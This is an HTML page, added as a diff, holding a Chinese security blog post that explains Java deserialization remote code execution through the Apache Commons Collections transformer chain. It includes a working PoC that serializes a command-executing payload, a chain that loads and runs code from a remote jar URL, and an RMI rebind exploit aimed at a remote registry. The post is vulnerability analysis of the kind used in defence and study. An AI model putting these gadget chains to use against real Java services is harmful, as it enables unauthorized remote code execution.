@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Java反序列化内容 | Manning23</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Java反序列化漏洞简介 Java序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，Java中的ObjectOutputStream类的writeObject()方法可以实现序列化。 Java反序列化即逆过程，由字节流还原成对象。ObjectInputStream类的readObject()方法用于反序列化。  因此要利用Java反序列化漏洞，需要在进行反序列化的地方传入攻击者的序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化内容">
+<meta property="og:url" content="http://yoursite.com/2015/12/22/Java反序列化内容/index.html">
+<meta property="og:site_name" content="Manning23">
+<meta property="og:description" content="Java反序列化漏洞简介 Java序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，Java中的ObjectOutputStream类的writeObject()方法可以实现序列化。 Java反序列化即逆过程，由字节流还原成对象。ObjectInputStream类的readObject()方法用于反序列化。  因此要利用Java反序列化漏洞，需要在进行反序列化的地方传入攻击者的序列化">
+<meta property="og:image" content="http://yoursite.com/2015/12/22/Java反序列化内容/org_apache_commons.png">
+<meta property="og:image" content="http://yoursite.com/2015/12/22/Java反序列化内容/interface_transformer.png">
+<meta property="og:image" content="http://yoursite.com/2015/12/22/Java反序列化内容/point.png">
+<meta property="og:updated_time" content="2017-05-25T07:23:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Java反序列化内容">
+<meta name="twitter:description" content="Java反序列化漏洞简介 Java序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，Java中的ObjectOutputStream类的writeObject()方法可以实现序列化。 Java反序列化即逆过程，由字节流还原成对象。ObjectInputStream类的readObject()方法用于反序列化。  因此要利用Java反序列化漏洞，需要在进行反序列化的地方传入攻击者的序列化">
+<meta name="twitter:image" content="http://yoursite.com/2015/12/22/Java反序列化内容/org_apache_commons.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Manning23" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Manning23</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Java反序列化内容" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/12/22/Java反序列化内容/" class="article-date">
+  <time datetime="2015-12-22T07:21:17.000Z" itemprop="datePublished">2015-12-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Java反序列化内容
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Java反序列化漏洞简介"><a href="#Java反序列化漏洞简介" class="headerlink" title="Java反序列化漏洞简介"></a>Java反序列化漏洞简介</h2><ul>
+<li>Java序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，Java中的ObjectOutputStream类的writeObject()方法可以实现序列化。</li>
+<li>Java反序列化即逆过程，由字节流还原成对象。ObjectInputStream类的readObject()方法用于反序列化。</li>
+</ul>
+<p>因此要利用Java反序列化漏洞，需要在<strong>进行反序列化的地方</strong>传入<strong>攻击者的序列化代码</strong>。能符合以上条件的地方即存在漏洞。</p>
+<h2 id="Java反序列化Poc详解"><a href="#Java反序列化Poc详解" class="headerlink" title="Java反序列化Poc详解"></a>Java反序列化Poc详解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">public class test &#123;</div><div class="line">    public static void main(String[] args) throws Exception &#123;</div><div class="line">        String[] execArgs = new String[] &#123; &quot;sh&quot;, &quot;-c&quot;, &quot;whoami &gt; /tmp/fuck&quot; &#125;;</div><div class="line">        Transformer[] transformers = new Transformer[] &#123;</div><div class="line">            new ConstantTransformer(Runtime.class),</div><div class="line">            new InvokerTransformer(</div><div class="line">                &quot;getMethod&quot;, </div><div class="line">                new Class[] &#123;String.class, Class[].class &#125;, </div><div class="line">                new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;</div><div class="line">            ),</div><div class="line">            new InvokerTransformer(</div><div class="line">                &quot;invoke&quot;, </div><div class="line">                new Class[] &#123;Object.class, </div><div class="line">                Object[].class &#125;, new Object[] &#123;null, null &#125;</div><div class="line">            ),</div><div class="line">            new InvokerTransformer(</div><div class="line">                &quot;exec&quot;, </div><div class="line">                new Class[] &#123;String[].class &#125;, </div><div class="line">                new Object[] &#123; execArgs &#125;</div><div class="line">            )</div><div class="line">         &#125;;</div><div class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</div><div class="line">        </div><div class="line">        Map&lt;String, String&gt; BeforeTransformerMap = new HashMap&lt;String, String&gt;();</div><div class="line">        BeforeTransformerMap.put(&quot;hello&quot;, &quot;manning&quot;);</div><div class="line">        </div><div class="line">        Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);</div><div class="line"></div><div class="line">        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</div><div class="line">        </div><div class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</div><div class="line">        ctor.setAccessible(true);</div><div class="line">        Object instance = ctor.newInstance(Target.class, AfterTransformerMap);</div><div class="line"></div><div class="line">        File f = new File(&quot;temp.bin&quot;);</div><div class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</div><div class="line">        out.writeObject(instance);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>如果想彻底理解上面的poc，需要明白Java中的一些概念。</p>
+<p>在Apache commons工具包中有很多jar包（jar包可以理解为python的库），具体jar包里面含有的内容，如下图所示。</p>
+<p><img src="/2015/12/22/Java反序列化内容/org_apache_commons.png" alt=""></p>
+<p>其中Java反序列化的问题出在org.apache.commons.collections这个库里面。org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为set，list，queue等等。换一种理解方式，collection是set，list，queue的抽象，collection中文含义是收集的意思，那么收集的具体方式就可以是set，list，queue了。</p>
+<p>在org.apache.commons.collections内提供了一个接口类叫Transformer，这个接口的英文定义为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Defines a functor interface implemented by classes that transform one object into another.</div></pre></td></tr></table></figure>
+<p>也就是说<strong>接口于Transformer</strong>的类都具备<strong>把一个对象转化为另一个对象</strong>的功能。目前已知<strong>接口于Transformer的类</strong>，如下如所示。</p>
+<p><img src="/2015/12/22/Java反序列化内容/interface_transformer.png" alt=""></p>
+<p>图上带箭头指示的为<strong>Java反序列化漏洞的poc</strong>含有的类。</p>
+<ul>
+<li><p>ConstantTransformer</p>
+<p>  Transformer implementation that returns the same constant each time. （把一个对象转化为常量，并返回）</p>
+</li>
+<li><p>InvokerTransformer</p>
+<p>  Transformer implementation that creates a new object instance by reflection. （通过反射，返回一个对象）</p>
+</li>
+<li><p>ChainedTransformer</p>
+<p>  Transformer implementation that chains the specified transformers together. （把一些transformer链接到一起，构成一组链条，对一个对象依次通过链条内的每一个transformer进行转换）</p>
+</li>
+</ul>
+<p>有了以上的相关概念，就可以理解最开始的poc了。poc里面，我们一共创建了以下关键对象。</p>
+<ul>
+<li><p>execArgs</p>
+<p>  待执行的命令数组</p>
+</li>
+<li><p>transformers</p>
+<p>  一个transformer链，包含预设转化逻辑（各类transformer对象）的转化数组</p>
+</li>
+<li><p>transformedChain</p>
+<p>  ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作</p>
+</li>
+<li><p>BeforeTransformerMap</p>
+<p>  Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict理解即可</p>
+</li>
+<li><p>AfterTransformerMap</p>
+<p>  Map数据结构，转换后的Map</p>
+</li>
+</ul>
+<p>整个poc的逻辑可以这么理解，构建了BeforeTransformerMap的键值对，为其赋值，利用TransformedMap的decorate方法，可以对Map数据结构的key，value进行transforme。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空），第三个参数为Map对象内的value要经过的转化方法。</div><div class="line"></div><div class="line">TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);</div></pre></td></tr></table></figure>
+<p><img src="/2015/12/22/Java反序列化内容/point.png" alt=""></p>
+<p>上图是调试时的转换变量内容，可以很清楚地看到执行完poc后，已经对Map的value进行了转换（过了一遍transformer链）。</p>
+<p>poc中对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行。</p>
+<p>在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。</p>
+<p>结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。</p>
+<p>因此我们在poc中看见了下行的代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</div></pre></td></tr></table></figure>
+<p>这个类完全符合我们的要求，具体解释可以查看<a href="http://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="external">TSRC的文章</a>。</p>
+<p><strong>如果要实现一个可控的poc，需要对transformer链的构造进行理解。首先来看InvokerTransformer。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</div><div class="line">参数依次为：方法名称，参数类型，参数对象</div><div class="line"></div><div class="line">我们找其中一个来看下。</div><div class="line"></div><div class="line"></div><div class="line">new InvokerTransformer(</div><div class="line">        &quot;getMethod&quot;, </div><div class="line">        new Class[]  &#123;String.class, Class[].class &#125;, </div><div class="line">        new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;</div><div class="line">    ),</div><div class="line">new InvokerTransformer(</div><div class="line">        &quot;invoke&quot;, </div><div class="line">        new Class[] &#123;Object.class, Object[].class &#125;, </div><div class="line">        new Object[] &#123;null, null &#125;</div><div class="line">        ),</div><div class="line">new InvokerTransformer(</div><div class="line">        &quot;exec&quot;, </div><div class="line">        new Class[] &#123;String.class &#125;, </div><div class="line">        new Object[] &#123;&quot;gedit&quot;&#125;</div><div class="line">    )</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">参数类型里面的内容完全对应于参数对象里的内容。</div><div class="line"></div><div class="line">PS：由于Method类的invoke(Object obj,Object args[])方法的定义，所以在反射内写new Class[] &#123;Object.class, Object[].class &#125;。</div><div class="line"></div><div class="line"></div><div class="line">所以正常流程如下所示：</div><div class="line"></div><div class="line">((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null)).exec(&quot;gedit&quot;); </div><div class="line">``` </div><div class="line">    </div><div class="line"></div><div class="line">## 基于报错的反序列化transformer链</div></pre></td></tr></table></figure>
+<p>Transformer[] transformers = new Transformer[] {<br>new ConstantTransformer(Java.net.URLClassLoader.class),<br>new InvokerTransformer(<br>        “getConstructor”,<br>        new Class[] {Class[].class},<br>        new Object[] {new Class[]{Java.net.URL[].class}}<br>    ),<br>new InvokerTransformer(<br>        “newInstance”,<br>        new Class[] {Object[].class},<br>        new Object[] { new Object[] { new Java.net.URL[] { new Java.net.URL(url) }}}<br>    ),<br>new InvokerTransformer(<br>        “loadClass”,<br>        new Class[] { String.class },<br>        new Object[] { “ErrorBaseExec” }<br>    ),<br>new InvokerTransformer(<br>        “getMethod”,<br>        new Class[]{String.class, Class[].class},<br>        new Object[]{“do_exec”, new Class[]{String.class}}<br>    ),<br>new InvokerTransformer(<br>        “invoke”,<br>        new Class[]{Object.class, Object[].class},<br>        new Object[]{null, new String[]{cmd}}<br>    )<br>};<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">有了先前的理解，这个链就很明了了。先建立一个读取远程jar文件的类 URLClassLoader，实例化这个类，传入要访问的url，再读取远程加载类，接着获取类方法，然后反射这个方法。</div><div class="line"></div><div class="line"></div><div class="line">## 关于RMI利用的相关内容</div><div class="line"></div><div class="line">申总已经在[RMI利用文章](http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/)讲过怎么利用了，这段内容，我只是详解下给出的poc的原理。</div></pre></td></tr></table></figure></p>
+<p>poc部分内容</p>
+<p>Transformer transformedChain = new ChainedTransformer(transformers);</p>
+<p>Map BeforeTransformerMap = new HashMap();<br>innerMap.put(“value”, “value”);<br>Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);</p>
+<p>Class cl = Class.forName(“sun.reflect.annotation.AnnotationInvocationHandler”);<br>Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);<br>ctor.setAccessible(true);<br>Object instance = ctor.newInstance(Target.class, AfterTransformerMap);</p>
+<p>InvocationHandler h = (InvocationHandler) instance;<br>Remote r = Remote.class.cast(Proxy.newProxyInstance(<br>                            Remote.class.getClassLoader(),<br>                            new Class[]{Remote.class},<br>                            h<br>                        )<br>                    );<br>try{<br>    Registry registry = LocateRegistry.getRegistry(ip, port);<br>    registry.rebind(“”, r); // r is remote obj<br>}<br>catch (Throwable e) {<br>    e.printStackTrace();<br>}<br>```<br>RMI利用的poc看上去还是很熟悉的，因为到建立instance时，还和之前的内容一致。之后便到了RMI内容独有的细节，从代码角度可以看出利用逻辑为：</p>
+<ul>
+<li>建立实例对象instance</li>
+<li>实例对象instance 转化为 InvocationHandler类型的句柄h（因为instence是序列化后的内容，所以instance就是一串数据）</li>
+<li>把句柄h附载到Remote类实例 r上</li>
+<li>向<strong>远程服务器</strong>注册，得到<strong>远程注册对象 registry</strong></li>
+<li>向<strong>远程注册对象registry</strong>注册 <strong>实例r</strong></li>
+</ul>
+<p>在Java的RMI中，我们允许向<strong>远程已运行的jvm虚拟环境</strong>中绑定（rebind函数，也可以理解为添加）一些实例对象，通过RMI协议传输一些序列化好的内容，这样服务端解析（也就是反序列化）传过来的数据后，便可把解析后的内容添加到运行环境中。poc中利用动态代理创建remote实例r是可行的一种方式，因此并不唯一。</p>
+<p>因此涉及RMI的代码也会存在Java反序列化漏洞。</p>
+<h2 id="漏洞影响分析"><a href="#漏洞影响分析" class="headerlink" title="漏洞影响分析"></a>漏洞影响分析</h2><p>Java反序列化漏洞从爆出到现在快2个月了。最开始的只能命令执行和反弹shell，到后来的有回显的命令执行，到最终的代码执行，利用上来是越来越方便（有回显的命令执行和代码执行均为利用远程jar文件的利用形式）。从微博来看，已有白帽子实现了jenkins，weblogic，jboss等的代码执行利用工具。待最终利用工具公布，此漏洞还会有一个上升趋势的影响。</p>
+<h2 id="资料引用"><a href="#资料引用" class="headerlink" title="资料引用"></a>资料引用</h2><ul>
+<li><a href="http://blog.chaitin.com/2015-11-11_java_unserialize_rce/" target="_blank" rel="external">http://blog.chaitin.com/2015-11-11_java_unserialize_rce/</a></li>
+<li><a href="http://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="external">http://security.tencent.com/index.php/blog/msg/97</a></li>
+<li><a href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="external">http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li>
+<li><a href="http://www.infoq.com/cn/articles/cf-java-object-serialization-rmi" target="_blank" rel="external">http://www.infoq.com/cn/articles/cf-java-object-serialization-rmi</a></li>
+<li><a href="http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/" target="_blank" rel="external">http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/12/22/Java反序列化内容/" data-id="cj343myee00020ofyrtds22bf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/05/05/ImageMagic初步分析/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ImageMagic初步分析
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">vBulletin 5.0.x - 5.1.x RCE</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/05/05/WordPress-4-6版本远程代码执行漏洞/">WordPress 4.6版本远程代码执行漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/21/Struts2-S046命令执行漏洞/">Struts2 S046命令执行漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/">Struts2 Jakarta模块Content-type命令执行漏洞(CVE-2017-5638)</a>
+          </li>
+        
+          <li>
+            <a href="/2016/05/05/ImageMagic初步分析/">ImageMagic初步分析</a>
+          </li>
+        
+          <li>
+            <a href="/2015/12/22/Java反序列化内容/">Java反序列化内容</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Manning23<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
